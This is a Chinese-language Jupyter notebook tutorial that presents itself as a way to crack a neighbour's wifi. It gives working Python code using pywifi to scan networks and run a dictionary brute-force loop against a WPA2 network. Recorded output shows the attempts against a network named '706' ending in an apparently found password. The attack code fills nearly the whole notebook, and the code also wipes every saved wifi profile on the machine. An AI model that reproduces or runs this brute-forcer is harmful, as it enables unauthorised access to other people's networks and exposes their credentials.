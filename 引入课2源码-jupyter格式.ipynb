{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# 【星夜与python】我想解密邻居家的wifi，python能帮到我什么？\n",
    "本期教程主要讲的是wifi的攻防，有点像互联网安全吧，这是代码文件，notebook太好用了  \n",
    "![avatar](course2-wifi1.jpg)\n",
    "# Step1:导入包\n",
    "### sys\n",
    "是与python解释器交互的一个接口\n",
    "### time\n",
    "在python中，所有跟时间有关的操作都要用到时间模块\n",
    "### platform\n",
    "获取操作系统(windows)的信息(比如用户、网卡什么的)\n",
    "### logging\n",
    "类似与日记，可以理解为一个记录小本本\n",
    "### pywifi\n",
    "利用python模拟连接wifi的一个模块（本次教程的主角）"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "#导入相关的包\n",
    "import sys\n",
    "import time\n",
    "import platform\n",
    "import logging\n",
    "\n",
    "import pywifi\n",
    "from pywifi import const\n",
    "pywifi.set_loglevel(logging.INFO)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Step2: 扫描wifi函数——scan_wifi"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "def scan_wifi():\n",
    "    #初始化wifi模块\n",
    "    wifi = pywifi.PyWiFi()\n",
    "    #初始化网卡，一般人只有一块网卡，也就是0（第一块）\n",
    "    iface = wifi.interfaces()[0]\n",
    "    #执行wifi扫描\n",
    "    iface.scan()\n",
    "    #等待5s\n",
    "    time.sleep(5)\n",
    "    #扫描wifi结果\n",
    "    result = iface.scan_results()\n",
    "    #取出wifi的名字作为返回\n",
    "    wifiname=[]\n",
    "    for i in result:\n",
    "        wifiname.append(i.ssid)\n",
    "    return(wifiname)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Step3:连接wifi函数——connect_wifi"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "def connect_wifi(name,password):\n",
    "    #初始化wifi模块\n",
    "    wifi = pywifi.PyWiFi()\n",
    "    #初始化网卡\n",
    "    iface = wifi.interfaces()[0]\n",
    "    #断开WiFi连接\n",
    "    iface.disconnect()\n",
    "    #等待1s（等待断开完成，可以设置2s，但一般1s都挺长的了）\n",
    "    time.sleep(1)\n",
    "    \n",
    "    assert iface.status() in\\\n",
    "        [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]\n",
    "    #初始化wifi连接\n",
    "    profile = pywifi.Profile()\n",
    "    #初始化wifi连接的名字\n",
    "    profile.ssid = name\n",
    "    #初始化wifi连接用的网卡的状态\n",
    "    profile.auth = const.AUTH_ALG_OPEN\n",
    "    #初始化wifi连接的加密算法——WPA2\n",
    "    profile.akm.append(const.AKM_TYPE_WPA2PSK)\n",
    "    #初始化wifi连接的密码类型\n",
    "    profile.cipher = const.CIPHER_TYPE_CCMP\n",
    "    #初始化wifi连接用的密码\n",
    "    profile.key = password\n",
    "    #删除网卡上连接过的wifi文件（注意可能会遗忘原本的密码）\n",
    "    iface.remove_all_network_profiles()\n",
    "    #初始化wifi配置完成\n",
    "    tmp_profile = iface.add_network_profile(profile)\n",
    "    #网卡连接wifi\n",
    "    iface.connect(tmp_profile)\n",
    "    #等待4s\n",
    "    time.sleep(4)\n",
    "    #如果连接状态=IFACE_CONNECTED（连接成功），那么connect_wifi返回真\n",
    "    if iface.status() == const.IFACE_CONNECTED:\n",
    "        return True\n",
    "    else:\n",
    "        return False"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Step4:解密wifi函数——crack_wifi(name)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "def crack_wifi(name):\n",
    "    #控制台打印要破解的wifi名\n",
    "    print('开始解密wifi名:'+name)\n",
    "    print(' ')\n",
    "    #密码字典（可以理解为一本新华字典，字典的内容都是密码）\n",
    "    path = 'pass.txt'\n",
    "    #将密码字典导入到程序\n",
    "    filename = open(path, 'r')\n",
    "    #开始解密\n",
    "    while True:\n",
    "        try:\n",
    "            #每一次循环取一行密码\n",
    "            passStr = filename.readline()\n",
    "            #用密码去连接wifi，并获取wifi连接的结果\n",
    "            bool1 = connect_wifi(name,passStr)\n",
    "            #判断结果\n",
    "            if bool1:\n",
    "                print(passStr,'是正确的密码哦')\n",
    "                break\n",
    "            else:\n",
    "                print(passStr,'不是正确的密码哦')\n",
    "        except:\n",
    "            continue"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-01 19:36:15,828 INFO Get interface: Qualcomm Atheros QCA9377 Wireless Network Adapter\n",
      "pywifi 2020-05-01 19:36:15,830 INFO iface 'Qualcomm Atheros QCA9377 Wireless Network Adapter' disconnects\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "开始解密wifi名:706\n",
      " \n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-01 19:36:16,849 INFO iface 'Qualcomm Atheros QCA9377 Wireless Network Adapter' connects to AP: '706'\n",
      "pywifi 2020-05-01 19:36:20,857 INFO Get interface: Qualcomm Atheros QCA9377 Wireless Network Adapter\n",
      "pywifi 2020-05-01 19:36:20,858 INFO iface 'Qualcomm Atheros QCA9377 Wireless Network Adapter' disconnects\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "111111\n",
      " 不是正确的密码哦\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-01 19:36:21,862 INFO iface 'Qualcomm Atheros QCA9377 Wireless Network Adapter' connects to AP: '706'\n",
      "pywifi 2020-05-01 19:36:25,869 INFO Get interface: Qualcomm Atheros QCA9377 Wireless Network Adapter\n",
      "pywifi 2020-05-01 19:36:25,871 INFO iface 'Qualcomm Atheros QCA9377 Wireless Network Adapter' disconnects\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "111113\n",
      " 不是正确的密码哦\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-01 19:36:26,877 INFO iface 'Qualcomm Atheros QCA9377 Wireless Network Adapter' connects to AP: '706'\n",
      "pywifi 2020-05-01 19:36:30,879 INFO Get interface: Qualcomm Atheros QCA9377 Wireless Network Adapter\n",
      "pywifi 2020-05-01 19:36:30,881 INFO iface 'Qualcomm Atheros QCA9377 Wireless Network Adapter' disconnects\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "111114\n",
      " 不是正确的密码哦\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-01 19:36:31,904 INFO iface 'Qualcomm Atheros QCA9377 Wireless Network Adapter' connects to AP: '706'\n",
      "pywifi 2020-05-01 19:36:35,909 INFO Get interface: Qualcomm Atheros QCA9377 Wireless Network Adapter\n",
      "pywifi 2020-05-01 19:36:35,910 INFO iface 'Qualcomm Atheros QCA9377 Wireless Network Adapter' disconnects\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "123456789\n",
      " 不是正确的密码哦\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-01 19:36:36,928 INFO iface 'Qualcomm Atheros QCA9377 Wireless Network Adapter' connects to AP: '706'\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "19802052288\n",
      " 是正确的密码哦\n"
     ]
    }
   ],
   "source": [
    "crack_wifi('706')"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
